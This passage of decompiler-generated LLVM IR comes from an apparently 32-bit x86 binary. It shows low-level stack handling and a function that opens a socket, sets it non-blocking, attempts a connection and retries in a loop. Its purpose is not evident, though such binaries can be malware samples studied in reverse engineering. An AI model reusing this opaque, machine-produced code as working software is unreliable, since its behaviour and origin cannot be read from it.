  %v0_80488b5 = load i32, i32* @esi, align 4
  %v1_80488b5 = load i32, i32* @esp, align 4
  %v2_80488b5 = inttoptr i32 %v1_80488b5 to i32*
  store i32 %v0_80488b5, i32* %v2_80488b5, align 4
  %v1_80488b8 = call i32 @function_804b1bb(i32 0)
  store i32 %v1_80488b8, i32* %eax.global-to-local, align 4
  %v0_80488bd = load i32, i32* @esp, align 4
  %v1_80488bd = add i32 %v0_80488bd, 16
  %v1_80488c0 = icmp eq i32 %v1_80488b8, 0
  store i32 %v1_80488b8, i32* @edi, align 4
  %v1_80488c4 = icmp eq i1 %v1_80488c0, false
  br i1 %v1_80488c4, label %dec_label_pc_80489c1, label %dec_label_pc_80489ef

dec_label_pc_80488cf:                             ; preds = %dec_label_pc_80489d8
  %v0_80488cf = load i32, i32* @esi, align 4
  %v2_80488cf = add i32 %v0_80489ce, 12
  %v3_80488cf = inttoptr i32 %v2_80488cf to i32*
  store i32 %v0_80488cf, i32* %v3_80488cf, align 4
  %v1_80488d0 = add i32 %v0_80489ce, 8
  %v2_80488d0 = inttoptr i32 %v1_80488d0 to i32*
  store i32 4096, i32* %v2_80488d0, align 4
  %v1_80488d5 = add i32 %v0_80489ce, 4
  %v2_80488d5 = inttoptr i32 %v1_80488d5 to i32*
  store i32 0, i32* %v2_80488d5, align 4
  %v1_80488d7 = add i32 %v0_80489ce, 59
  store i32 %v1_80488d7, i32* @ebp, align 4
  %v3_80488db = inttoptr i32 %v0_80489ce to i32*
  store i32 %v1_80488d7, i32* %v3_80488db, align 4
  %v4_80488dc = call i32 @function_804a6fc(i32 0, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80488dc, i32* @eax, align 4
  %v0_80488e1 = load i32, i32* @esp, align 4
  %v1_80488e1 = inttoptr i32 %v0_80488e1 to i32*
  store i32 3, i32* %v1_80488e1, align 4
  %v2_80488e8 = call i32 @function_804828b(i8 0)
  store i32 %v2_80488e8, i32* %eax.global-to-local, align 4
  %v0_80488ed = load i32, i32* @esp, align 4
  %v1_80488ed = inttoptr i32 %v0_80488ed to i32*
  %v3_80488ed = add i32 %v0_80488ed, 4
  %v1_80488ee = inttoptr i32 %v3_80488ed to i32*
  store i32 %v2_80488e8, i32* %v1_80488ee, align 4
  %v1_80488f0 = add i32 %v0_80488ed, 4155
  store i32 %v1_80488f0, i32* @ebx, align 4
  store i32 %v1_80488f0, i32* %v1_80488ed, align 4
  %v2_80488f8 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v0_80488fd = load i32, i32* @ebx, align 4
  %v1_80488fd = load i32, i32* @esp, align 4
  %v2_80488fd = inttoptr i32 %v1_80488fd to i32*
  store i32 %v0_80488fd, i32* %v2_80488fd, align 4
  %v1_8048900 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048900, i32* %eax.global-to-local, align 4
  %v0_8048905 = load i32, i32* @esp, align 4
  %v1_8048905 = inttoptr i32 %v0_8048905 to i32*
  %v2_8048905 = load i32, i32* %v1_8048905, align 4
  store i32 %v2_8048905, i32* %esi.global-to-local, align 4
  %v3_8048905 = add i32 %v0_8048905, 4
  %v1_8048906 = inttoptr i32 %v3_8048905 to i32*
  %v1_8048907 = add i32 %v0_8048905, 40
  %v2_8048907 = inttoptr i32 %v1_8048907 to i32*
  %v3_8048907 = load i32, i32* %v2_8048907, align 4
  store i32 %v3_8048907, i32* %v1_8048906, align 4
  %v0_804890b = load i32, i32* @ebx, align 4
  %v2_804890b = add i32 %v0_804890b, %v1_8048900
  store i32 %v2_804890b, i32* %eax.global-to-local, align 4
  store i32 %v2_804890b, i32* %v1_8048905, align 4
  %v2_804890f = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804890f, i32* @eax, align 4
  %v0_8048914 = load i32, i32* @esp, align 4
  %v1_8048914 = inttoptr i32 %v0_8048914 to i32*
  store i32 7, i32* %v1_8048914, align 4
  %v2_804891b = call i32 @function_804828b(i8 0)
  store i32 %v2_804891b, i32* %eax.global-to-local, align 4
  %v0_8048920 = load i32, i32* @ebx, align 4
  %v1_8048920 = load i32, i32* @esp, align 4
  %v2_8048920 = inttoptr i32 %v1_8048920 to i32*
  store i32 %v0_8048920, i32* %v2_8048920, align 4
  store i32 %v2_804891b, i32* %esi.global-to-local, align 4
  %v1_8048925 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048925, i32* %eax.global-to-local, align 4
  %v0_804892a = load i32, i32* @esp, align 4
  %v1_804892a = inttoptr i32 %v0_804892a to i32*
  %v3_804892a = add i32 %v0_804892a, 4
  %v1_804892b = inttoptr i32 %v3_804892a to i32*
  %v0_804892c = load i32, i32* @ebx, align 4
  %v2_804892c = add i32 %v0_804892c, %v1_8048925
  store i32 %v2_804892c, i32* %eax.global-to-local, align 4
  %v0_804892f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804892f, i32* %v1_804892b, align 4
  %v0_8048930 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048930, i32* %v1_804892a, align 4
  %v2_8048931 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8048931, i32* %eax.global-to-local, align 4
  %v0_8048936 = load i32, i32* @ebx, align 4
  %v1_8048936 = load i32, i32* @esp, align 4
  %v2_8048936 = inttoptr i32 %v1_8048936 to i32*
  store i32 %v0_8048936, i32* %v2_8048936, align 4
  %v1_8048939 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048939, i32* %eax.global-to-local, align 4
  %v0_804893e = load i32, i32* @esp, align 4
  %v1_804893e = inttoptr i32 %v0_804893e to i32*
  %v3_804893e = add i32 %v0_804893e, 4
  %v1_804893f = inttoptr i32 %v3_804893e to i32*
  %v2_804893f = load i32, i32* %v1_804893f, align 4
  store i32 %v2_804893f, i32* %esi.global-to-local, align 4
  %v0_8048940 = load i32, i32* @ebx, align 4
  %v2_8048940 = add i32 %v0_8048940, %v1_8048939
  store i32 %v2_8048940, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_804d301.36 to i32), i32* %v1_804893f, align 4
  %v0_8048948 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048948, i32* %v1_804893e, align 4
  %v2_8048949 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8048949, i32* %eax.global-to-local, align 4
  %v0_804894e = load i32, i32* @ebx, align 4
  %v1_804894e = load i32, i32* @esp, align 4
  %v2_804894e = inttoptr i32 %v1_804894e to i32*
  store i32 %v0_804894e, i32* %v2_804894e, align 4
  %v1_8048951 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* @esi, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v1_8048958 = add i32 %v0_8048956, 28
  %v2_8048958 = inttoptr i32 %v1_8048958 to i32*
  %v3_8048958 = load i32, i32* %v2_8048958, align 4
  %v0_804895c = load i32, i32* @ebx, align 4
  %v2_804895c = add i32 %v0_804895c, %v1_8048951
  store i32 %v2_804895c, i32* %eax.global-to-local, align 4
  %v1_804895f = add i32 %v3_8048958, 11
  store i32 %v1_804895f, i32* %v1_8048957, align 4
  %v0_8048963 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048963, i32* %v1_8048956, align 4
  %v2_8048964 = call i32 @function_804a6d6(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8048964, i32* %eax.global-to-local, align 4
  %v0_8048969 = load i32, i32* @esp, align 4
  %v1_804896c = add i32 %v0_8048969, 8
  %v2_804896c = inttoptr i32 %v1_804896c to i32*
  store i32 4096, i32* %v2_804896c, align 4
  %v0_8048971 = load i32, i32* @ebp, align 4
  %v2_8048971 = add i32 %v0_8048969, 4
  %v3_8048971 = inttoptr i32 %v2_8048971 to i32*
  store i32 %v0_8048971, i32* %v3_8048971, align 4
  %v0_8048972 = load i32, i32* @ebx, align 4
  %v3_8048972 = inttoptr i32 %v0_8048969 to i32*
  store i32 %v0_8048972, i32* %v3_8048972, align 4
  %v0_8048973 = call i32 @function_804b01e()
  %v0_8048978 = load i32, i32* @esp, align 4
  %v1_804897b = add i32 %v0_8048973, 1
  %v8_804897b = icmp eq i32 %v1_804897b, 0
  store i32 %v1_804897b, i32* %eax.global-to-local, align 4
  br i1 %v8_804897b, label %dec_label_pc_80489c1.backedge, label %dec_label_pc_804897e

dec_label_pc_804897e:                             ; preds = %dec_label_pc_80488cf
  %v0_8048981 = load i32, i32* @ebp, align 4
  %v3_8048981 = inttoptr i32 %v0_8048978 to i32*
  store i32 %v0_8048981, i32* %v3_8048981, align 4
  %v1_8048982 = call i32 @function_804a688(i32 0)
  store i32 %v1_8048982, i32* %eax.global-to-local, align 4
  %v0_8048987 = load i32, i32* @esp, align 4
  %v1_804898a = add i32 %v0_8048987, 8780
  store i32 %v1_804898a, i32* @edx, align 4
  %v2_8048991 = add i32 %v0_8048987, 8
  %v3_8048991 = inttoptr i32 %v2_8048991 to i32*
  store i32 %v1_804898a, i32* %v3_8048991, align 4
  %v2_8048992 = add i32 %v0_8048987, 4
  %v3_8048992 = inttoptr i32 %v2_8048992 to i32*
  store i32 %v1_8048982, i32* %v3_8048992, align 4
  %v0_8048993 = load i32, i32* @ebp, align 4
  %v3_8048993 = inttoptr i32 %v0_8048987 to i32*
  store i32 %v0_8048993, i32* %v3_8048993, align 4
  %v4_8048994 = call i32 @function_804ad50(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048999 = load i32, i32* @esp, align 4
  %v1_804899c = add i32 %v4_8048994, 1
  %v8_804899c = icmp eq i32 %v1_804899c, 0
  store i32 %v1_804899c, i32* %eax.global-to-local, align 4
  br i1 %v8_804899c, label %dec_label_pc_80489c1.backedge, label %dec_label_pc_804899f

dec_label_pc_804899f:                             ; preds = %dec_label_pc_804897e
  %v0_804899f = load i32, i32* @ebx, align 4
  %v2_804899f = add i32 %v0_8048999, 12
  %v3_804899f = inttoptr i32 %v2_804899f to i32*
  store i32 %v0_804899f, i32* %v3_804899f, align 4
  %v0_80489a0 = load i32, i32* @ebx, align 4
  %v2_80489a0 = add i32 %v0_8048999, 8
  %v3_80489a0 = inttoptr i32 %v2_80489a0 to i32*
  store i32 %v0_80489a0, i32* %v3_80489a0, align 4
  %v1_80489a1 = add i32 %v0_8048999, 4
  %v2_80489a1 = inttoptr i32 %v1_80489a1 to i32*
  store i32 10, i32* %v2_80489a1, align 4
  %v1_80489a3 = add i32 %v0_8048999, 40
  %v2_80489a3 = inttoptr i32 %v1_80489a3 to i32*
  %v3_80489a3 = load i32, i32* %v2_80489a3, align 4
  %v6_80489a3 = inttoptr i32 %v0_8048999 to i32*
  store i32 %v3_80489a3, i32* %v6_80489a3, align 4
  %v0_80489a7 = call i32 @function_804a85d()
  store i32 %v0_80489a7, i32* %eax.global-to-local, align 4
  %v0_80489ac = load i32, i32* @esp, align 4
  %v1_80489ac = inttoptr i32 %v0_80489ac to i32*
  %v3_80489ac = add i32 %v0_80489ac, 4
  %v1_80489ad = inttoptr i32 %v3_80489ac to i32*
  store i32 9, i32* %v1_80489ad, align 4
  store i32 %v0_80489a7, i32* %v1_80489ac, align 4
  %v2_80489b1 = call i32 @function_804af6b(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_80489b1, i32* %eax.global-to-local, align 4
  %v0_80489b6 = load i32, i32* @esp, align 4
  %v1_80489b6 = add i32 %v0_80489b6, 32
  %v2_80489b6 = inttoptr i32 %v1_80489b6 to i32*
  store i32 1, i32* %v2_80489b6, align 4
  %v0_80489be = load i32, i32* @esp, align 4
  br label %dec_label_pc_80489c1.backedge

dec_label_pc_80489c1.backedge:                    ; preds = %dec_label_pc_804899f, %dec_label_pc_80488cf, %dec_label_pc_804897e
  %v0_80489c144.in = phi i32 [ %v0_80489be, %dec_label_pc_804899f ], [ %v0_8048978, %dec_label_pc_80488cf ], [ %v0_8048999, %dec_label_pc_804897e ]
  %v0_80489c144 = add i32 %v0_80489c144.in, 16
  %v0_80489c4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_8048869, %dec_label_pc_80489c1.backedge
  %v0_80489c4 = phi i32 [ %v0_80489c4.pre, %dec_label_pc_80489c1.backedge ], [ %v1_80488b8, %dec_label_pc_8048869 ]
  %v0_80489c1 = phi i32 [ %v0_80489c144, %dec_label_pc_80489c1.backedge ], [ %v1_80488bd, %dec_label_pc_8048869 ]
  %v2_80489c4 = add i32 %v0_80489c1, -16
  %v3_80489c4 = inttoptr i32 %v2_80489c4 to i32*
  store i32 %v0_80489c4, i32* %v3_80489c4, align 4
  %v0_80489c5 = call i32 @function_804b2ac()
  store i32 %v0_80489c5, i32* @eax, align 4
  %v1_80489ca = load i32, i32* @esp, align 4
  %v2_80489ca = add i32 %v1_80489ca, 28
  %v3_80489ca = inttoptr i32 %v2_80489ca to i32*
  store i32 %v0_80489c5, i32* %v3_80489ca, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489d1 = add i32 %v0_80489ce, 28
  %v2_80489d1 = inttoptr i32 %v1_80489d1 to i32*
  %v3_80489d1 = load i32, i32* %v2_80489d1, align 4
  %v4_80489d1 = icmp eq i32 %v3_80489d1, 0
  br i1 %v4_80489d1, label %dec_label_pc_80489e3, label %dec_label_pc_80489d8

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v1_80489d8 = add i32 %v0_80489ce, 32
  %v2_80489d8 = inttoptr i32 %v1_80489d8 to i32*
  %v3_80489d8 = load i32, i32* %v2_80489d8, align 4
  %v4_80489d8 = icmp eq i32 %v3_80489d8, 0
  br i1 %v4_80489d8, label %dec_label_pc_80488cf, label %dec_label_pc_80489e3

dec_label_pc_80489e3:                             ; preds = %dec_label_pc_80489d8, %dec_label_pc_80489c1
  %v0_80489e6 = load i32, i32* @edi, align 4
  %v3_80489e6 = inttoptr i32 %v0_80489ce to i32*
  store i32 %v0_80489e6, i32* %v3_80489e6, align 4
  %v0_80489e7 = call i32 @function_804b14b()
  store i32 %v0_80489e7, i32* %eax.global-to-local, align 4
  %v0_80489ec = load i32, i32* @esp, align 4
  %v1_80489ec = add i32 %v0_80489ec, 16
  br label %dec_label_pc_80489ef

dec_label_pc_80489ef:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_8048869, %dec_label_pc_80487f9, %dec_label_pc_80489e3, %dec_label_pc_80487b4
  %v0_80489ef = phi i32 [ %v15_804852d, %dec_label_pc_80487b4 ], [ %v1_80489ec, %dec_label_pc_80489e3 ], [ %v1_804885f, %dec_label_pc_80487f9 ], [ %v1_80488bd, %dec_label_pc_8048869 ], [ %v0_80489ef.pre.pre, %dec_label_pc_80487e5 ]
  %v1_80489f2 = add i32 %v0_80489ef, 8
  %v2_80489f2 = inttoptr i32 %v1_80489f2 to i32*
  %v3_80489f2 = load i32, i32* %v2_80489f2, align 4
  %v5_80489f2 = add i32 %v0_80489ef, -16
  %v6_80489f2 = inttoptr i32 %v5_80489f2 to i32*
  store i32 %v3_80489f2, i32* %v6_80489f2, align 4
  %v0_80489f6 = call i32 @function_804b2ac()
  store i32 %v0_80489f6, i32* @eax, align 4
  %v0_80489fb = load i32, i32* @esp, align 4
  %v1_80489fe = icmp eq i32 %v0_80489f6, 0
  br i1 %v1_80489fe, label %dec_label_pc_8048a0d, label %dec_label_pc_8048a02

dec_label_pc_8048a02:                             ; preds = %dec_label_pc_80489ef
  %v1_8048a02 = add i32 %v0_80489fb, 32
  %v2_8048a02 = inttoptr i32 %v1_8048a02 to i32*
  %v3_8048a02 = load i32, i32* %v2_8048a02, align 4
  %v4_8048a02 = icmp eq i32 %v3_8048a02, 0
  br i1 %v4_8048a02, label %dec_label_pc_80487e5, label %dec_label_pc_8048a0d

dec_label_pc_8048a0d:                             ; preds = %dec_label_pc_8048a02, %dec_label_pc_80489ef
  %v1_8048a10 = add i32 %v0_80489fb, 24
  %v2_8048a10 = inttoptr i32 %v1_8048a10 to i32*
  %v3_8048a10 = load i32, i32* %v2_8048a10, align 4
  %v6_8048a10 = inttoptr i32 %v0_80489fb to i32*
  store i32 %v3_8048a10, i32* %v6_8048a10, align 4
  %v0_8048a14 = call i32 @function_804b14b()
  store i32 %v0_8048a14, i32* %eax.global-to-local, align 4
  %v0_8048a19 = load i32, i32* @esp, align 4
  %v1_8048a19 = add i32 %v0_8048a19, 16
  br label %dec_label_pc_8048a1c

dec_label_pc_8048a1c:                             ; preds = %dec_label_pc_80487b4, %dec_label_pc_8048a0d
  %v0_8048a1c = phi i32 [ %v15_804852d, %dec_label_pc_80487b4 ], [ %v1_8048a19, %dec_label_pc_8048a0d ]
  %v1_8048a1f = add i32 %v0_8048a1c, -16
  %v2_8048a1f = inttoptr i32 %v1_8048a1f to i32*
  store i32 1, i32* %v2_8048a1f, align 4
  %v1_8048a21 = call i32 @function_804c4a7(i32 0)
  store i32 %v1_8048a21, i32* @eax, align 4
  %v0_8048a26 = load i32, i32* @esp, align 4
  %v1_8048a26 = inttoptr i32 %v0_8048a26 to i32*
  store i32 3, i32* %v1_8048a26, align 4
  %v2_8048a2d = call i32 @function_804820a(i8 0)
  store i32 %v2_8048a2d, i32* @eax, align 4
  %v0_8048a32 = load i32, i32* @esp, align 4
  %v1_8048a32 = inttoptr i32 %v0_8048a32 to i32*
  store i32 5, i32* %v1_8048a32, align 4
  %v2_8048a39 = call i32 @function_804820a(i8 0)
  store i32 %v2_8048a39, i32* @eax, align 4
  %v0_8048a3e = load i32, i32* @esp, align 4
  %v1_8048a3e = inttoptr i32 %v0_8048a3e to i32*
  store i32 7, i32* %v1_8048a3e, align 4
  %v2_8048a45 = call i32 @function_804820a(i8 0)
  store i32 %v2_8048a45, i32* @eax, align 4
  %v0_8048a4a = load i32, i32* @esp, align 4
  %v1_8048a4a = inttoptr i32 %v0_8048a4a to i32*
  store i32 6, i32* %v1_8048a4a, align 4
  %v2_8048a51 = call i32 @function_804820a(i8 0)
  store i32 %v2_8048a51, i32* %eax.global-to-local, align 4
  %v0_8048a56 = load i32, i32* @esp, align 4
  %v1_8048a56 = add i32 %v0_8048a56, 32
  %v2_8048a56 = inttoptr i32 %v1_8048a56 to i8*
  %v3_8048a56 = load i8, i8* %v2_8048a56, align 1
  %v4_8048a56 = sext i8 %v3_8048a56 to i32
  br label %dec_label_pc_8048a5b

dec_label_pc_8048a5b:                             ; preds = %dec_label_pc_804877f, %dec_label_pc_8048a1c
  %v0_8048a5b = phi i32 [ %v0_8048a5b.pre, %dec_label_pc_804877f ], [ %v0_8048a56, %dec_label_pc_8048a1c ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804877f ], [ %v4_8048a56, %dec_label_pc_8048a1c ]
  store i32 %storemerge3, i32* %eax.global-to-local, align 4
  %v1_8048a5b = add i32 %v0_8048a5b, 16
  br label %dec_label_pc_8048a6d

dec_label_pc_8048a6d:                             ; preds = %dec_label_pc_80485e5, %dec_label_pc_8048a5b
  %v0_8048a77 = phi i32 [ 0, %dec_label_pc_80485e5 ], [ %storemerge3, %dec_label_pc_8048a5b ]
  %v0_8048a6d = phi i32 [ %v15_804852d, %dec_label_pc_80485e5 ], [ %v1_8048a5b, %dec_label_pc_8048a5b ]
  %v1_8048a6d = add i32 %v0_8048a6d, 8780
  %v1_8048a73 = inttoptr i32 %v1_8048a6d to i32*
  %v2_8048a73 = load i32, i32* %v1_8048a73, align 4
  store i32 %v2_8048a73, i32* @ebx, align 4
  %v3_8048a73 = add i32 %v0_8048a6d, 8784
  %v1_8048a74 = inttoptr i32 %v3_8048a73 to i32*
  %v2_8048a74 = load i32, i32* %v1_8048a74, align 4
  store i32 %v2_8048a74, i32* @esi, align 4
  %v3_8048a74 = add i32 %v0_8048a6d, 8788
  %v1_8048a75 = inttoptr i32 %v3_8048a74 to i32*
  %v2_8048a75 = load i32, i32* %v1_8048a75, align 4
  store i32 %v2_8048a75, i32* @edi, align 4
  %v3_8048a75 = add i32 %v0_8048a6d, 8792
  %v1_8048a76 = inttoptr i32 %v3_8048a75 to i32*
  %v2_8048a76 = load i32, i32* %v1_8048a76, align 4
  store i32 %v2_8048a76, i32* @ebp, align 4
  ret i32 %v0_8048a77

; uselistorder directives
  uselistorder i32 %v0_8048a6d, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80489fb, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80489f6, { 1, 3, 2, 0 }
  uselistorder i32 %v0_80489ef, { 1, 0 }
  uselistorder i32 %v0_80489ce, { 0, 5, 7, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8048999, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v7_804864680, { 1, 0 }
  uselistorder i8 %v4_804864678, { 1, 2, 0 }
  uselistorder i32 %v1_8048725, { 1, 0 }
  uselistorder i32 %v1_804871d, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v3_8048712, { 1, 0, 2 }
  uselistorder i32 %v7_80486e3, { 3, 0, 1, 2 }
  uselistorder i8 %v3_80486e3, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80486dd, { 2, 4, 1, 0, 3 }
  uselistorder i32 %v0_80486c6, { 2, 3, 1, 0 }
  uselistorder i32 %v1_80486de, { 1, 0 }
  uselistorder i32 %v0_80486de, { 3, 0, 2, 1 }
  uselistorder i32 %v1_80486c6, { 1, 2, 0 }
  uselistorder i32 %v4_804865f, { 1, 0 }
  uselistorder i32 %v1_804865e, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8048659, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804863e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8048678, { 1, 0, 2 }
  uselistorder i32 %v2_804861a, { 1, 0, 2 }
  uselistorder i32 %v2_8048591, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804854e, { 3, 10, 9, 11, 7, 6, 4, 5, 8, 0, 1, 2, 12, 13 }
  uselistorder i32 %v2_804853b, { 5, 4, 6, 2, 1, 3, 0 }
  uselistorder i32 %v15_804852d, { 2, 3, 0, 1 }
  uselistorder i32* %stack_var_-8812, { 1, 3, 4, 5, 2, 6, 7, 8, 10, 11, 9, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i8* %stack_var_-48, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 70, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2, 53, 54, 55, 56, 0, 57, 58, 62, 59, 60, 61, 4, 3, 1, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73 }
  uselistorder i32 ()* @function_804b14b, { 1, 0 }
  uselistorder i32 8780, { 1, 0 }
  uselistorder i32 ()* @function_804b01e, { 1, 0 }
  uselistorder i32 (i32)* @function_804b1bb, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804a965, { 1, 0 }
  uselistorder label %dec_label_pc_8048a6d, { 1, 0 }
  uselistorder label %dec_label_pc_8048a5b, { 1, 0 }
  uselistorder label %dec_label_pc_8048a1c, { 1, 0 }
  uselistorder label %dec_label_pc_80489ef, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_80489c1, { 1, 0 }
  uselistorder label %dec_label_pc_80489c1.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048761, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804875a, { 1, 0 }
  uselistorder label %dec_label_pc_804870a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048705, { 1, 0 }
  uselistorder label %dec_label_pc_80486eb, { 1, 0 }
  uselistorder label %dec_label_pc_80486e3, { 1, 0 }
  uselistorder label %dec_label_pc_80486dd, { 1, 0 }
  uselistorder label %dec_label_pc_804873f.backedge, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804866a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048665, { 1, 0 }
  uselistorder label %dec_label_pc_80485e5, { 1, 0 }
}

define i32 @function_8048a78() local_unnamed_addr {
dec_label_pc_8048a78:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v2_8048aae = ptrtoint i32* %stack_var_-12 to i32
  %v2_8048afe = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8048a82

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_8048b3c, %dec_label_pc_8048a78
  %stack_var_-41.0 = phi i8 [ 1, %dec_label_pc_8048a78 ], [ %v4_8048b3c, %dec_label_pc_8048b3c ]
  %v3_8048a89 = call i32 @function_804b584(i32 2, i32 1, i32 0)
  %v10_8048a91 = icmp eq i32 %v3_8048a89, -1
  store i32 %v3_8048a89, i32* @global_var_804f5e4.37, align 4
  br i1 %v10_8048a91, label %dec_label_pc_8048b3c, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a82
  store i32 1, i32* %stack_var_-12, align 4
  %v5_8048ab8 = call i32 @function_804b549(i32 %v3_8048a89, i32 1, i32 2, i32 %v2_8048aae, i32 4)
  %v0_8048ac4 = load i32, i32* @global_var_804f5e4.37, align 4
  %v3_8048aca = call i32 @function_804adb0(i32 %v0_8048ac4, i32 3, i32 0)
  %v12_8048ad2 = or i32 %v3_8048aca, 2048
  %v0_8048ad8 = load i32, i32* @global_var_804f5e4.37, align 4
  %v3_8048ade = call i32 @function_804adb0(i32 %v0_8048ad8, i32 4, i32 %v12_8048ad2)
  %v12_8048aeb = icmp eq i8 %stack_var_-41.0, 1
  br i1 %v12_8048aeb, label %dec_label_pc_8048af7, label %dec_label_pc_8048af2

dec_label_pc_8048af2:                             ; preds = %dec_label_pc_8048aa1
  br label %dec_label_pc_8048af7

dec_label_pc_8048af7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048af2
  store i32 2, i32* %stack_var_-28, align 4
  store i32 %v2_8048afe, i32* @esi, align 4
  %v1_8048b0d = call i32 @function_804b330(i32 2)
  %v1_8048b12 = inttoptr i32 %v1_8048b0d to i32*
  store i32 0, i32* %v1_8048b12, align 4
  store i32 %v1_8048b0d, i32* @ebx, align 4
  %v0_8048b1e = load i32, i32* @global_var_804f5e4.37, align 4
  %v4_8048b24 = call i32 @function_804b3c1(i32 %v0_8048b1e, i32 %v2_8048afe, i32 16, i32 %v1_8048b0d)
  %v1_8048b2c = icmp eq i32 %v4_8048b24, 0
  br i1 %v1_8048b2c, label %dec_label_pc_8048b4c, label %dec_label_pc_8048b30

dec_label_pc_8048b30:                             ; preds = %dec_label_pc_8048af7
  %v0_8048b30 = load i32, i32* @ebx, align 4
  %v1_8048b30 = inttoptr i32 %v0_8048b30 to i32*
  %v2_8048b30 = load i32, i32* %v1_8048b30, align 4
  %v9_8048b32 = icmp eq i32 %v2_8048b30, 99
  br i1 %v9_8048b32, label %dec_label_pc_8048b3c, label %dec_label_pc_8048b37

dec_label_pc_8048b37:                             ; preds = %dec_label_pc_8048b30
  %v9_8048b37 = icmp eq i32 %v2_8048b30, 13
  %v1_8048b3a = icmp eq i1 %v9_8048b37, false
  br i1 %v1_8048b3a, label %dec_label_pc_8048b6e, label %dec_label_pc_8048b3c

dec_label_pc_8048b3c:                             ; preds = %dec_label_pc_8048b37, %dec_label_pc_8048b30, %dec_label_pc_8048a82
  %v4_8048b3c = add nuw nsw i8 %stack_var_-41.0, 1
  %v12_8048b40 = icmp eq i8 %stack_var_-41.0, 2
  br i1 %v12_8048b40, label %dec_label_pc_8048bb0, label %dec_label_pc_8048a82

dec_label_pc_8048b4c:                             ; preds = %dec_label_pc_8048af7
  br i1 %v12_8048aeb, label %dec_label_pc_8048b53, label %dec_label_pc_8048bb0

dec_label_pc_8048b53:                             ; preds = %dec_label_pc_8048b4c
  %v0_8048b53 = load i32, i32* @ecx, align 4
  %v0_8048b57 = load i32, i32* @global_var_804f5e4.37, align 4
  %v4_8048b5d = call i32 @function_804b47d(i32 %v0_8048b57, i32 1, i32 %v0_8048b53, i32 %v0_8048b53)
  %v8_8048b65 = icmp eq i32 %v4_8048b5d, -1
  %v1_8048b66 = icmp eq i1 %v8_8048b65, false
  %v2_8048b66 = zext i1 %v1_8048b66 to i32
  br label %dec_label_pc_8048bb2

dec_label_pc_8048b6e:                             ; preds = %dec_label_pc_8048b37
  %v0_8048b6e = load i32, i32* @edx, align 4
  %v0_8048b72 = load i32, i32* @global_var_804f5e4.37, align 4
  %v4_8048b78 = call i32 @function_804b3ec(i32 %v0_8048b72, i32 %v2_8048afe, i32 16, i32 %v0_8048b6e)
  %v1_8048b84 = call i32 @function_804c4a7(i32 5)
  %v0_8048b8a = load i32, i32* @global_var_804f5e4.37, align 4
  %v1_8048b90 = call i32 @function_804ae74(i32 %v0_8048b8a)
  %v2_8048b9c = call i32 @function_8048527(i16 -6725)
  %v0_8048ba1 = call i32 @function_8048a78()
  br label %dec_label_pc_8048bb2

dec_label_pc_8048bb0:                             ; preds = %dec_label_pc_8048b3c, %dec_label_pc_8048b4c
  br label %dec_label_pc_8048bb2

